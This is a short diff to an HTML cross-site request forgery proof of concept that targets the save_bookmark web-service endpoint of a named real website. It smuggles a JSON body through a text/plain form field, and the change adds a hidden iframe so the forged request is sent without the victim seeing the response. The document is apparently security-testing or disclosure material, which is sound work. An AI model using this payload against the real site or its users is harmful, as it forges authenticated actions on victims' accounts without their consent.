@@ -1,18 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF PoC - Save Bookmark</title>
-</head>
 <body>
   <h2>CSRF PoC - Save Bookmark</h2>
 
   <form action="https://www.powerpak.com/ws/api.asmx/save_bookmark"
         method="POST"
-        enctype="text/plain">
+        enctype="text/plain"
+        target="csrfFrame">
 
     <input type="hidden" name='{"entity_id":"124041"}' value="">
-
     <button type="submit">Submit CSRF</button>
   </form>
+
+  <iframe name="csrfFrame" style="display:none;"></iframe>
 </body>
 </html>
